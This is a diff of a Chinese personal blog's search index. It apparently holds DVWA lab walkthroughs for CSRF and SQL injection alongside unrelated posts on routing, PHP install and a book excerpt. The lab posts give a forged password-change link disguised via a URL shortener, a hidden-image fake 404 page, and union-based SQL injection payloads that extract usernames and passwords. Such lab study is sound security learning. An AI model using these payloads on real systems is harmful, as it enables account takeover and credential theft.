-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155243.png" alt="15" loading="lazy"></p>
-<ul>
-<li>route print查看</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155246.png" alt="16" loading="lazy"></p>
-<ul>
-<li>Route delete删除</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220608155252.png" alt="17" loading="lazy"></p>
-<ul>
-<li>说明：增添&#x2F;删除静态路由操作需要在Windows超级管理员权限下进行</li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>锐捷</category>
-      </categories>
-      <tags>
-        <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装PHP5</title>
     <url>/posts/b394315b/</url>
     <content><![CDATA[<p>参考：<a href="https://www.cnblogs.com/xxdebug/p/14142266.html">centos7安装PHP5 - xiaoxiaoの - 博客园 </a></p>
@@ -4644,113 +5106,6 @@ PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source 
       </categories>
       <tags>
         <tag>CentOS7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa--CSRF</title>
-    <url>/posts/4161e8ef/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF是一种攻击，它迫使最终用户在当前已通过身份验证的web应用程序上执行不想要的操作。借助一点社会工程的帮助(例如通过电子邮件&#x2F;聊天发送链接)，攻击者可能会迫使web应用程序的用户执行攻击者所选择的操作。</p>
-<p>一个成功的CSRF攻击可以在正常用户的情况下损害最终用户数据和操作。如果目标终端用户是管理员帐户，这可能会危及整个web应用程序。</p>
-<p>这种攻击也可以称为“XSRF”，类似于“跨站点脚本编写(XSS)”，它们经常一起使用。</p>
-<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
-<h2 id="Low级"><a href="#Low级" class="headerlink" title="Low级"></a>Low级</h2><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span></code></pre>
-
-<p>stripos() ：数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
-<p>HTTP Referer：是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
-<p>SERVER_NAME：是要访问的主机名</p>
-<p>过滤规则为http包头的Referer参数的值中是否包含主机名</p>
-<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>伪造链接</p>
-<p><a href="http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
-<p>一旦用户点击链接，就会出现红字：提示密码改变了</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164025.png" alt="1" loading="lazy"></p>
-<p>这样我们就成功地将密码更改为password了<br>当然，我们可以将链接修饰一下，毕竟这样一看就能看出来。<br>比如我们可以在网上找一个短链接生成器</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164031.png" alt="2" loading="lazy"></p>
-<p>得到这个链接：<a href="http://5l8.cn/ffHx0">http://5l8.cn/ffHx0</a></p>
-<p>伪装一下：<a href="http://5l8.cn/ffHx0">Change</a></p>
-<p>也可以构造一个html界面</p>
-<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>404<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>file not found.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164034.png" alt="3" loading="lazy"><em>看似是一个失效界面，实际已经改掉了密码。</em></p>
-<h2 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h2><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>与low难度一样，没有token，这时候，我们可以看一下源代码比起low级多了</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></code></pre>
-
-
-
-<p><code>stripos() </code>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br><code>HTTP Referer</code>是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br><code>SERVER_NAME</code>是要访问的主机名<br>过滤规则为http包头的Referer参数的值中是否包含主机名</p>
-<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>抓包</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164039.png" alt="4" loading="lazy"></p>
-<p>会发现有一栏Referer，就是该页面的url</p>
-<p><code>	Referer: http://192.168.224.135/dvwa/vulnerabilities/csrf/	</code></p>
-<p>开启抓包拦截、接着使用此前构造的链接尝试会发现报文里没有REferer</p>
-<p><a href="http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164042.png" alt="5" loading="lazy"></p>
-<p>我们在报文里加上，然后放行</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164044.png" alt="6" loading="lazy"></p>
-<p>提示密码修改成功</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164046.png" alt="7" loading="lazy"></p>
-<h2 id="High级-amp-Impossible级"><a href="#High级-amp-Impossible级" class="headerlink" title="High级&amp;Impossible级"></a>High级&amp;Impossible级</h2><p>略</p>
-<p>注：教程来自[<em><a href="https://www.iculture.cc/cybersecurity/pig=243">【DVWA全攻略】DVWA CSRF 实验-FancyPig’s blog </a></em></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dvwa--SQL注入(low)</title>
-    <url>/posts/cb7e67e1/</url>
-    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
-
-<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
-<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
-<p>① 输入1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
-<p>②输入1’ 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
-<p>③输入1 and 1&#x3D;1 提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
-<p>④输入1 and 1&#x3D;2提交</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
-<p>**猜解 SQL 查询语句中的字段数, **</p>
-<p>①1’ order by 1#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
-<p>②1’ order by 2#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
-<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
-<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
-<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
-<p><strong>查询当前的数据库, 以及版本</strong></p>
-<p>1’ union select version(),database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
-<p>获取数据库中的表,</p>
-<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
-<p>获取表中的字段名,</p>
-<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
-<p>获得字段中的数据,</p>
-<p>1’ union select user, password from users#</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>DVWA</category>
-      </categories>
-      <tags>
-        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -4984,6 +5339,113 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
       </tags>
   </entry>
   <entry>
+    <title>dvwa--CSRF</title>
+    <url>/posts/4161e8ef/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF是一种攻击，它迫使最终用户在当前已通过身份验证的web应用程序上执行不想要的操作。借助一点社会工程的帮助(例如通过电子邮件&#x2F;聊天发送链接)，攻击者可能会迫使web应用程序的用户执行攻击者所选择的操作。</p>
+<p>一个成功的CSRF攻击可以在正常用户的情况下损害最终用户数据和操作。如果目标终端用户是管理员帐户，这可能会危及整个web应用程序。</p>
+<p>这种攻击也可以称为“XSRF”，类似于“跨站点脚本编写(XSS)”，它们经常一起使用。</p>
+<h2 id="CSRF与XSS区别"><a href="#CSRF与XSS区别" class="headerlink" title="CSRF与XSS区别"></a>CSRF与XSS区别</h2><p>CSRF是借助用户的权限完成攻击，攻击者并没有拿到用户的权限。目标构造修改个人信息的链接，利用lucy在登录状态下点击此链接达到修改信息的目的。<br>XSS直接盗取了用户的权限，然后实施破坏。攻击者利用XSS盗取了目标的Cookie，登录lucy的后台，再修改相关信息。</p>
+<h2 id="Low级"><a href="#Low级" class="headerlink" title="Low级"></a>Low级</h2><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span></code></pre>
+
+<p>stripos() ：数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>
+<p>HTTP Referer：是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
+<p>SERVER_NAME：是要访问的主机名</p>
+<p>过滤规则为http包头的Referer参数的值中是否包含主机名</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>伪造链接</p>
+<p><a href="http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
+<p>一旦用户点击链接，就会出现红字：提示密码改变了</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164025.png" alt="1" loading="lazy"></p>
+<p>这样我们就成功地将密码更改为password了<br>当然，我们可以将链接修饰一下，毕竟这样一看就能看出来。<br>比如我们可以在网上找一个短链接生成器</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164031.png" alt="2" loading="lazy"></p>
+<p>得到这个链接：<a href="http://5l8.cn/ffHx0">http://5l8.cn/ffHx0</a></p>
+<p>伪装一下：<a href="http://5l8.cn/ffHx0">Change</a></p>
+<p>也可以构造一个html界面</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#<span class="token punctuation">"</span></span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>404<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>file not found.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164034.png" alt="3" loading="lazy"><em>看似是一个失效界面，实际已经改掉了密码。</em></p>
+<h2 id="Medium级"><a href="#Medium级" class="headerlink" title="Medium级"></a>Medium级</h2><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>与low难度一样，没有token，这时候，我们可以看一下源代码比起low级多了</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></code></pre>
+
+
+
+<p><code>stripos() </code>函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br><code>HTTP Referer</code>是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br><code>SERVER_NAME</code>是要访问的主机名<br>过滤规则为http包头的Referer参数的值中是否包含主机名</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>抓包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164039.png" alt="4" loading="lazy"></p>
+<p>会发现有一栏Referer，就是该页面的url</p>
+<p><code>	Referer: http://192.168.224.135/dvwa/vulnerabilities/csrf/	</code></p>
+<p>开启抓包拦截、接着使用此前构造的链接尝试会发现报文里没有REferer</p>
+<p><a href="http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.224.135/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164042.png" alt="5" loading="lazy"></p>
+<p>我们在报文里加上，然后放行</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164044.png" alt="6" loading="lazy"></p>
+<p>提示密码修改成功</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/CSRF--dvwa/20220414164046.png" alt="7" loading="lazy"></p>
+<h2 id="High级-amp-Impossible级"><a href="#High级-amp-Impossible级" class="headerlink" title="High级&amp;Impossible级"></a>High级&amp;Impossible级</h2><p>略</p>
+<p>注：教程来自[<em><a href="https://www.iculture.cc/cybersecurity/pig=243">【DVWA全攻略】DVWA CSRF 实验-FancyPig’s blog </a></em></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa--SQL注入(low)</title>
+    <url>/posts/cb7e67e1/</url>
+    <content><![CDATA[<h1 id="dvwa–SQL注入（low）"><a href="#dvwa–SQL注入（low）" class="headerlink" title="dvwa–SQL注入（low）"></a>dvwa–SQL注入（low）</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 </p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>low级代码分析</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span></code></pre>
+
+<p>未对输入进行过滤，我们输入的内容会传给<code>$id</code>，因此可以考虑在输入上做文章</p>
+<p><strong>我们可以通过以下步骤判断这里是否存在注入点</strong></p>
+<p>① 输入1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091015.png" alt="1" loading="lazy"></p>
+<p>②输入1’ 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091034.png" alt="2" loading="lazy"></p>
+<p>③输入1 and 1&#x3D;1 提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091040.png" alt="3" loading="lazy"></p>
+<p>④输入1 and 1&#x3D;2提交</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091048.png" alt="4" loading="lazy"></p>
+<p>**猜解 SQL 查询语句中的字段数, **</p>
+<p>①1’ order by 1#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091052.png" alt="5" loading="lazy"></p>
+<p>②1’ order by 2#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091055.png" alt="6" loading="lazy"></p>
+<p>③1’ order by 3# 从上面两个图, 可以说明,,SQL 语句查询的表的的字段数位 2</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091100.png" alt="7" loading="lazy"></p>
+<p>④确定显示的位置 (SQL 语句查询之后的回显位置)</p>
+<p>1’ union select 1,2# #从下图可以看出有 2 个回显</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091102.png" alt="8" loading="lazy"></p>
+<p><strong>查询当前的数据库, 以及版本</strong></p>
+<p>1’ union select version(),database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091105.png" alt="9" loading="lazy"></p>
+<p>获取数据库中的表,</p>
+<p>1’ union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091108.png" alt="10" loading="lazy"></p>
+<p>获取表中的字段名,</p>
+<p>1’union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091111.png" alt="11" loading="lazy"></p>
+<p>获得字段中的数据,</p>
+<p>1’ union select user, password from users#</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/dvwa--SQL%E6%B3%A8%E5%85%A5/20220421091114.png" alt="12" loading="lazy"></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>DVWA</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fiddler汉化</title>
     <url>/posts/29ab9ab2/</url>
     <content><![CDATA[<p>fiddler及汉化补丁下载链接：<a href="https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w">https://pan.baidu.com/s/17qtgvvG8wjtcbAUdR4gJsw?pwd=9f3w</a><br>提取码：9f3w</p>
@@ -5178,6 +5640,128 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
       </categories>
       <tags>
         <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《天堂旅行团》摘抄</title>
+    <url>/posts/7d0fc3d8/</url>
+    <content><![CDATA[
+    <div id="aplayer-pEmnOGgm" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
+    ></div>
+
+
+
+<h2 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h2><p>该书讲述了一个默默无闻的小人物平凡却惊心动魄的人生。几乎要被生活碾压成泥的主人公宋一鲤，意外踏上一场有关生命意义与救赎的治愈之旅。</p>
+<p>宋一鲤的不理想人生，大概要从五岁时，父母婚姻不睦、父亲离家出走算起。刚强的母亲，独自承担起抚养儿子的责任。直至十岁，老家传来父亲病故的噩耗，少年宋一鲤的心里才开始真正地恨上了父亲——那个永远将自己丢在人间的男人。</p>
+<p>随着年龄的增长，宋一鲤像其他普通人一样生活学习，并与大学同学林艺结了婚。可在母亲病倒后，一切都变了。宋一鲤搞不清，这个弯是在哪儿拐的？他与妻子接手了家里的小饭馆，不仅无法照顾母亲，妻子也因不甘心这样生活而提出离婚。宋一鲤一下子被生活打懵了，不知道自己错在哪儿？除了借酒浇愁，做什么都打不起精神。宋一鲤觉得自己没有尽到做儿子、丈夫的责任，没法给母亲、妻子创造更好的生活。</p>
+<p>癌症女孩小聚，就像位天使，降临到了宋一鲤的“人间”。她不仅保护了宋一鲤，还赋予了他重新面对生活的勇气。因为小聚嚷着要去看演唱会，宋一鲤不得不开着他那辆破烂面包车，带着小聚从南京出发，去了武汉，去昆明，再去南昌，一路上遇见了很多人，打了好几场架，管了不少闲事。旅途中，宋一鲤的世界忽然开阔了，不再纠缠于自己在夜里数也数不清的伤痕。他亲眼看见了他人的痛苦与勇敢，看见了他人的责任与担当</p>
+<p>来自：<a href="https://baike.baidu.com/item/%E5%A4%A9%E5%A0%82%E6%97%85%E8%A1%8C%E5%9B%A2/58293831?fr=aladdin">百度百科</a></p>
+<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><blockquote>
+<p>遇见你，就像跋山涉水遇见一轮明月，以后天黑心伤，就问那天借一点月光。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮在远方坠落，浪潮在堤岸破碎，统统不能回到原点。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮永远都在，悬挂于时间长河之中。我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>她突然的来，突然的走。我慢慢明白，人与人之间没有突然，她想好了才会来，想清了才会走。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>世界是有尽头的，在南方洋流的末端，冰山漂浮，云和水一起冻结。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>时间治愈不了一切，她只会把泥泞日复一日的堆积。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>一个人内心有裂痕的时候，都是静悄悄的，这个世界没人能察觉，只有当他砰的一声碎开，大家才会听到。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>你这个人就是棵荒草，别人稍微爱你一下，就恨不得把心都掏出来。但你是棵荒草啊，能掏出什么来，最多最多，把自己点着了，让人家暖一下手。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>孤独来自于生命中那些重要的人，他们的影子扎根在旧时光，笑容不知道去了何方。</p>
+</blockquote>
+<br>
+
+<blockquote>
